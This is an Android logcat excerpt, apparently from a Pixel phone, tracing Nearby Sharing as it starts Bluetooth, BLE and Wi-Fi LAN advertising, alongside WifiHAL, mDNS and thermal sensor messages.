+09-04 07:18:52.420   992  1083 I WifiHAL : createRequest: APF set program request
+09-04 07:18:52.420   992  1083 I WifiHAL : mProgramLen : 414
+09-04 07:18:52.421 11073 16777 I NearbyMediums: Stopped Wifi LAN advertising.
+09-04 07:18:52.421 11073 16777 I NearbyMediums: Stopped listening for incoming Wifi Lan connections.
+09-04 07:18:52.421 11073 16777 I NearbyMediums: Can't stop accepting WiFi connections because it was never started.
+09-04 07:18:52.421 11073 16777 I NearbyMediums: Can't stop NFC advertising because it was never started.
+09-04 07:18:52.421 11073 16777 I NearbyMediums: Skipping stop accepting connections: we are not currently accepting WebRTC connections for NearbySharing.
+09-04 07:18:52.421 11073 16777 I NearbyMediums: [WifiNetworkV2] WifiStatusChangedCallback unregistered for NearbySharing (wifiStatusChangedCallbacks.size:0)
+09-04 07:18:52.425 11073 14893 E NearbyMediums: MEDIUM_ERROR [SYSTEM][WIFI_LAN][START_LISTENING_INCOMING_CONNECTION][ACCEPT_CONNECTION_FAILED][SOCKET_CLOSED], service-id=NearbySharing
+09-04 07:18:52.425 11073 14893 E NearbyMediums: Extra Sensitive/PII message : Socket closed
+09-04 07:18:52.431 11073 16777 I Nearby  : (REDACTED) Successfully shutdown executor %s.
+09-04 07:18:52.433 11073 16777 I NearbyMediums: Stopped BLE scanning, service-id=NearbyConnections.TxAdvertisement
+09-04 07:18:52.433 11073 16777 I NearbyConnections: [InstantConnectionPcpMgr] In invalidateTxAdvertisementScanning(by stopAdvertising) tx advertisement scanning skipped or stopped for endpointId:PHTC serviceId:NearbySharing isScreenUnlocked:true isAdvertising:false powerLevel:BALANCED isTxScanning:true
+09-04 07:18:52.433 11073 16776 I NearbySharing: Loading certificates with visibility ALL_CONTACTS
+09-04 07:18:52.434 11073 16776 I NearbySharing: Saving the private certificate to file nearby_sharing_private_certificate_file_for_all_contacts.
+09-04 07:18:52.449 11073 16776 I NearbySharing: Network state changed: NetworkState(isRestricted=false, isOnline=true, isCongested=false, isMetered=false, isWifiConnected=true)
+09-04 07:18:52.449 11073 16776 I NearbySharing: Network state changed: NetworkState(isRestricted=false, isOnline=true, isCongested=false, isMetered=false, isWifiConnected=true)
+09-04 07:18:52.450 11073 11230 I NearbyConnections: ClientProxy(0p:com.google.android.gms.nearby.sharing) allow WebRtc to use mobile data.
+09-04 07:18:52.450 11073 11230 I NearbyConnections: Client 163682648 requested advertising to start.
+09-04 07:18:52.451 11073 16776 I NearbyConnections: 163682648 0p:com.google.android.gms.nearby.sharing startAdvertising in nc mode.
+09-04 07:18:52.451 11073 16774 I Nearby  : (REDACTED) Note nearby client %s for operation %s
+09-04 07:18:52.457 11073 16774 I NearbyConnections: Instant Connection Security key rotated.
+09-04 07:18:52.457 11073 16774 I NearbyConnections: Scheduled invalidation of the HPKE key alarm (delayMillis:8000) for client 163682648
+09-04 07:18:52.457 11073 16774 I NearbyConnections: Get local endpoint id from random generation 16RH (last:null) for client 163682648
+09-04 07:18:52.458 11073 16774 I NearbyMediums: Started BLE scanning, service-id=NearbyConnections.TxAdvertisement, is-extended-advert=true, power-level=2, scan-mode=3
+09-04 07:18:52.458 11073 16774 I NearbyConnections: [InstantConnectionPcpMgr] In invalidateTxAdvertisementScanning(by pre_startAdvertising) tx advertisement scanning successfully started for enpointId:16RH serviceId:NearbySharing isScreenUnlocked:true powerLevel:BALANCED
+09-04 07:18:52.458 11073 16774 I NearbyConnections: [PcpManager] In startAdvertising() advertisingMediums:[WIFI_DIRECT, WIFI_HOTSPOT, WIFI_AWARE, WIFI_LAN, BLE] upgradeMediums:[USB, WIFI_LAN, WIFI_DIRECT, WIFI_AWARE, WIFI_HOTSPOT, WEB_RTC, BLE_L2CAP, BLUETOOTH, BLE, NFC] listener:71679384
+09-04 07:18:52.458 11073 16774 I NearbyConnections: Get local endpoint id from the existing localEndpointId:16RH (last:null) for client 163682648(0p:com.google.android.gms.nearby.sharing)
+09-04 07:18:52.459 11073 16774 I NearbyMediums: [DeviceCapabilities] Get wifi usable channels from cache for mode WFD_GC (tryToRefreshCache:false channels:[2412..2472, 5180..5240, 5745..5825])
+09-04 07:18:52.459 11073 16774 I NearbyMediums: [DeviceCapabilities] Get wifi usable channels from cache for mode WFD_GO (tryToRefreshCache:false channels:[2412..2472, 5180..5240, 5745..5825])
+09-04 07:18:52.460 11073 16774 I NearbyMediums: [DeviceCapabilities] Get wifi usable channels from cache for mode STA (tryToRefreshCache:false channels:[2412..2472, 5180..5320, 5500..5720, 5745..5825])
+09-04 07:18:52.460 11073 16774 I NearbyMediums: [DeviceCapabilities] Get wifi usable channels from cache for mode AWARE (tryToRefreshCache:false channels:[2412..2472, 5180..5240, 5745..5825])
+09-04 07:18:52.460 11073 16774 I NearbyConnections: In generateRxInstantConnectionAdvBytes() advertisingMediums:[WIFI_DIRECT, WIFI_HOTSPOT, WIFI_AWARE, WIFI_LAN, BLE] capabilitiesSize:5 apFreq:2412 wfdGcUsableOrAvailableChs:[2412..2472, 5180..5240, 5745..5825] wfdGoUsableOrAvailableChs:[2412..2472, 5180..5240, 5745..5825] hsStaUsableOrAvailableChs:[2412..2472, 5180..5320, 5500..5720, 5745..5825] awareUsableOrAvailableChs:[2412..2472, 5180..5240, 5745..5825] rxAdvertisement(size:63):A0:17:A5:DB:00:3C:E7:9B:E6:F7:B6:FB:BC:48:60:E5:27:89:F1:D5:D3:C7:3C:AF:20:B2:C0:E3:5D:E0:6A:65:36:01:84:15:05:61:00:00:84:15:06:61:00:00:84:15:04:7F:00:00:84:15:07:61:00:00:83:15:01:09:6C
+09-04 07:18:52.461 11073 16774 D BluetoothSocket: bindListen(): mPort=-1, mType=1
+09-04 07:18:52.462  2162  2174 I BluetoothSocketManagerBinder: createSocketChannel: type=1, serviceName=NearbySharing, uuid=a82efa21-ae5c-3dde-9bbc-f16da7b16c5a, port=-1, from uid/pid=10266/11073
+09-04 07:18:52.462  2162  2174 I bt_btif_sock: system/btif/src/btif_sock.cc:166 btsock_listen: Attempting listen for socket connections for device: 00:00:00:00:00:00, type: 1, channel: -1, app_uid: 10266, data_path: 0, hub_id: 0, endpoint_id: 0, max_rx_packet_size: 0
+09-04 07:18:52.462  2162  2174 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:401 btsock_rfc_listen: Adding listening socket service_name: NearbySharing - channel: -1
+09-04 07:18:52.462  2162  2543 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:1023 jv_dm_cback: handling event:BTA_JV_GET_SCN_EVT, slot_id:53
+09-04 07:18:52.462  2162  2543 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:1023 jv_dm_cback: handling event:BTA_JV_CREATE_RECORD_EVT, slot_id:53
+09-04 07:18:52.462  2162  2543 I bt_bta_dm: system/bta/dm/bta_dm_act.cc:1134 bta_dm_set_eir: Generating extended inquiry response packet EIR
+09-04 07:18:52.462 11073 16774 D BluetoothSocket: bindListen(), SocketState: INIT, mPfd: {ParcelFileDescriptor: java.io.FileDescriptor@726f47a}
+09-04 07:18:52.462  2162  2543 W rfcomm_port_utils: system/stack/rfcomm/port_utils.cc:290 port_find_mcb: not found, bd_addr:ff:ff:ff:ff:ff:ff
+09-04 07:18:52.462 11073 16774 D BluetoothSocket: bindListen(), Create LocalSocket
+09-04 07:18:52.462 11073 16774 D BluetoothSocket: bindListen(), new LocalSocket.getInputStream()
+09-04 07:18:52.462 11073 16774 D BluetoothSocket: bindListen(), readInt mSocketIS: android.net.LocalSocketImpl$SocketInputStream@a6f742b
+09-04 07:18:52.462  2162  2543 I bt_port_api: system/stack/rfcomm/port_api.cc:194 RFCOMM_CreateConnectionWithSecurity: bd_addr=ff:ff:ff:ff:ff:ff, scn=12, is_server=true, mtu=990, uuid=0x0, dlci=24, signal_state=0xb, port_handle=27
+09-04 07:18:52.462 11073 16774 D BluetoothSocket: bindListen(): channel=12, mPort=-1
+09-04 07:18:52.462  2162  2543 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:975 rfcomm_cback: handling BTA_JV_RFCOMM_START_EVT, slot_id:53
+09-04 07:18:52.462  2162  2543 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:649 on_srv_rfc_listen_started: listening for RFCOMM socket connections for device: 00:00:00:00:00:00, scn: 12, app_uid: 10266, id: 53
+09-04 07:18:52.462 11073 16774 I NearbyMediums: Started accepting Bluetooth Classic connections for NearbySharing.
+09-04 07:18:52.463 11073 16777 D BluetoothSocket: accept(), timeout (ms):-1
+09-04 07:18:52.464 11073 16774 D BluetoothAdapter: isLeEnabled(): ON
+09-04 07:18:52.466  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:158 StartAdvertisingSet: in shim layer
+09-04 07:18:52.467  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:185 StartAdvertisingSet: create advertising set, client_id:255, reg_id:-222
+09-04 07:18:52.467  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:421 allocate_advertiser: Removing advertiser id 3 from removed advertisers.
+09-04 07:18:52.467  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:663 create_extended_advertiser_with_id: Scheduling address rotation for advertiser_id=3
+09-04 07:18:52.467  2162  2549 I bluetooth: system/gd/hci/le_address_manager.cc:557 GetNextPrivateAddressIntervalRange: client=advertising_set_3, nonwake=8m0s, wake=14m27s
+09-04 07:18:52.469  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:1735 on_set_advertising_set_random_address_complete: update random address for advertising set 3 : xx:xx:xx:xx:da:8b
+09-04 07:18:52.470  2162  2622 I bluetooth: bluetooth_private_gatt::gatt::server::isolation_manager: associating server ServerId(51) with advertising set AdvertiserId(3)
+09-04 07:18:52.471 11073 16774 I NearbyMediums: Started BLE extended advertising. Regular Advertised : false, Fast Advertised : true, AdvertisingSetting : BleAdvertisingSetting{powerLevel= BALANCED_POWER, isConnectable= false, isPrivateGatt= true}.
+09-04 07:18:52.471 11073 16774 D BluetoothAdapter: isLeEnabled(): ON
+09-04 07:18:52.473  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:158 StartAdvertisingSet: in shim layer
+09-04 07:18:52.473  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:185 StartAdvertisingSet: create advertising set, client_id:255, reg_id:-223
+09-04 07:18:52.473  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:421 allocate_advertiser: Removing advertiser id 4 from removed advertisers.
+09-04 07:18:52.473  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:663 create_extended_advertiser_with_id: Scheduling address rotation for advertiser_id=4
+09-04 07:18:52.473  2162  2549 I bluetooth: system/gd/hci/le_address_manager.cc:557 GetNextPrivateAddressIntervalRange: client=advertising_set_4, nonwake=8m37s, wake=13m25s
+09-04 07:18:52.475  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:1735 on_set_advertising_set_random_address_complete: update random address for advertising set 4 : xx:xx:xx:xx:65:8a
+09-04 07:18:52.476  2162  2622 I bluetooth: bluetooth_private_gatt::gatt::server::isolation_manager: associating server ServerId(51) with advertising set AdvertiserId(4)
+09-04 07:18:52.477 11073 16774 I NearbyMediums: Started BLE Legacy advertising. Regular Header Advertised : false, Fast Advertised : true, AdvertisingSettings : BleAdvertisingSetting{powerLevel= BALANCED_POWER, isConnectable= false, isPrivateGatt= true}, isAcceptingConnection : false
+09-04 07:18:52.477 11073 16774 I NearbyMediums: Successfully started BLE advertising of size 23 for service NearbySharing, deviceToken : [ 0x20 0x1f ].
+09-04 07:18:52.482 11073 16774 I NearbyMediums: Successfully bound ServerSocket for service NearbySharing to the stable port 53601.
+09-04 07:18:52.482 11073 16774 I NearbyMediums: Successfully started listening for incoming Wifi Lan connections.
+09-04 07:18:52.483  1431  1956 D ConnectivityService: NetReassign [no changes] [c 0] [a 3] [i 2]
+09-04 07:18:52.486   992  1083 D WifiHAL : Setting DTIM config , halHandle = 0xb400007a8c865550 Multiplier = 9
+09-04 07:18:52.486   992  1083 I WifiHAL : Successfully configured dtim multiplier 9
+09-04 07:18:52.488 11073 16774 I NearbyPresence: (REDACTED) isApfV6Mandated: result=%b (hardware=%b [vendorApiLevel=%d, isPixel9=%b], software=%b [version=%d, min=%d])
+09-04 07:18:52.488  1431  1956 D ConnectivityService: NetReassign [no changes] [c 0] [a 2] [i 1]
+09-04 07:18:52.488  1431  6903 I WifiService: acquireMulticastLock uid=10266 lockTag=nearby-connections-238160697
+09-04 07:18:52.488 11073 16774 I Nearby  : (REDACTED) NsdManagerCompat acquired multicast lock %d.
+09-04 07:18:52.489  2138  2960 D IpClient.wlan0: set max DTIM multiplier to 1
+09-04 07:18:52.490   992  1083 E WifiHAL : Setting APF program, halHandle = 0xb400007a8c865550
+09-04 07:18:52.490   992  1083 E WifiHAL : Set apf filter for iface = wlan0
+09-04 07:18:52.490   992  1083 I WifiHAL : createRequest: APF set program request
+09-04 07:18:52.490   992  1083 I WifiHAL : mProgramLen : 310
+09-04 07:18:52.490  1431  1959 V serviceDiscovery: [MdnsSocketProvider] VERBOSE Already monitoring sockets.
+09-04 07:18:52.490  1431  1959 I serviceDiscovery: [MdnsAdvertiser] Adding service name: IzE2Ukj8n14AAA, type: _FC9F5ED42C8A._tcp, subtypes: , hostAddresses: , hostname: null, port: 53601, network: null, expirationTime: null, txtRecord: {f=2412, n=Mn39SJZVw_9rAewx3q-1KsY, IPv4=192.168.1.4} with ID 53 and subtypes {} advertisingOptions MdnsAdvertisingOptions{ }
+09-04 07:18:52.491  1431  1959 I WifiService: acquireMulticastLock uid=1000 lockTag=NsdService
+09-04 07:18:52.503   992  1083 D WifiHAL : Setting DTIM config , halHandle = 0xb400007a8c865550 Multiplier = 1
+09-04 07:18:52.503   992  1083 I WifiHAL : Successfully configured dtim multiplier 1
+09-04 07:18:53.291  1431  1959 I serviceDiscovery: [MdnsAdvertiser.wlan0] Probing finished for service 53
+09-04 07:18:53.299 11073 11356 I NearbyMediums: WIFI_LAN registered service name:IzE2Ukj8n14AAA type:null at ip:null port:0
+09-04 07:18:53.300 11073 16774 I NearbyMediums: Successfully advertised IzE2Ukj8n14AAA on serviceID NearbySharing over Wifi LAN.
+09-04 07:18:53.306 11073 16774 I NearbyMediums: [WifiNetworkV2] WifiStatusChangedCallback registered for NearbySharing (wifiStatusChangedCallbacks.size:1)
+09-04 07:18:53.309 11073 16774 I NearbyConnections: Get local endpoint id from the existing localEndpointId:16RH (last:null) for client 163682648(0p:com.google.android.gms.nearby.sharing)
+09-04 07:18:53.311 11073 16774 I NearbySharing: [broadcast provider] advertising started.
+09-04 07:18:53.311 11073 16774 I NearbySharing: [broadcast controller] started.
+09-04 07:18:53.311 11073 16774 I NearbySharing: [ReceiveManager] started.
+09-04 07:18:53.312 11073 16774 I NearbySharing: NearbySharing Internal event ReceiveManagerStart(mode=2, isEveryoneMode=false, dataUsage=2, useQrCode=false, success=true)
+09-04 07:18:53.314 11073 16778 I NearbySharing: [ClearcutLog] ADVERTISE_DEVICE_PRESENCE_START sessionId=0 flowId=6647782224758798388 sessionStatus: 1, visibility: 1
+09-04 07:18:53.999   992  1083 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:54.130   992  1083 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 130 ms
+09-04 07:18:54.182   992  1083 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:54.182   992  1083 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:54.182   992  1083 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:54.182   992  1083 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:54.428  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:77 Unregister: in shim layer
+09-04 07:18:54.429  2162  2622 I bluetooth: bluetooth_private_gatt::gatt::server::isolation_manager: removing server (if any) associated with advertiser AdvertiserId(2)
+09-04 07:18:54.459   928  2558 I bthal.activity: bt_power: LeAdvStat: 07:18:53:457 - 07:18:54:459, duration: 1001, le_adv_count: 1, total_le_adv_count: 4858, total_event_count: 21
+09-04 07:18:55.235  1729  1732 I pixel-thermal: cellular-emergency:33.6277 raw data: VIRTUAL-NEUTRAL:33627.7 VIRTUAL-NEUTRAL-SKIN2:33404 VIRTUAL-QUIET-NEUTRAL:32851.6 VIRTUAL-SKIN:33627.7 cellular-emergency:33627.7 disp_therm:32685 gnss_tcxo_therm:34154 neutral_therm:32930 quiet_therm:32818 skin_therm1:34132 skin_therm2:34510 
+09-04 07:18:55.236  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU:33.6277 raw data: VIRTUAL-SKIN:33627.7 VIRTUAL-SKIN-CPU:33627.7 
+09-04 07:18:55.236  1729  1732 I pixel-thermal: neutral_therm:32.93 raw data: neutral_therm:32930 
+09-04 07:18:55.236  1729  1732 I pixel-thermal: VIRTUAL-SKIN:33.6277 raw data: VIRTUAL-SKIN:33627.7 
+09-04 07:18:55.236  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU-GPU:33.6277 raw data: VIRTUAL-SKIN:33627.7 VIRTUAL-SKIN-CPU-GPU:33627.7 
+09-04 07:18:55.237  1729  1732 I pixel-thermal: VIRTUAL-SKIN-HINT:33.6277 raw data: VIRTUAL-SKIN:33627.7 VIRTUAL-SKIN-HINT:33627.7 
+09-04 07:18:55.237  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CHARGE:33.6277 raw data: VIRTUAL-SKIN:33627.7 VIRTUAL-SKIN-CHARGE:33627.7 
+09-04 07:18:55.336  2193  2499 D TemperatureStateSource: sequence=2554 actualDelay=10002
+09-04 07:18:55.338  2193  2499 D TemperatureStateSource: Reading temperature: sequence=2555
+09-04 07:18:55.341  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.6277 raw data: VIRTUAL-SKIN:33627.7 
+09-04 07:18:55.343  2193  2499 D TemperatureStateSource: getDeviceTemperatures: sequence=2555 deviceTemperatureType=3 temperatureSource=0 temperatures=[33.6277]
+09-04 07:18:55.344  2193  2499 D TemperatureStateSource: sequence=2555 waitTime=10000
+09-04 07:18:55.345  2193  3242 D ImpulseStateSource: Notify clients: 2565
+09-04 07:18:55.414  1431  1604 I SharedLibrariesImpl: Start pruneUnusedStaticSharedLibraries for neededSpace: 9223372036854775807 maxCachePeriod: 604800000
+09-04 07:18:55.483   928  2558 I bthal.activity: bt_power: LeAdvStat: 07:18:54:482 - 07:18:55:483, duration: 1000, le_adv_count: 1, total_le_adv_count: 4859, total_event_count: 22
+09-04 07:18:56.179 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
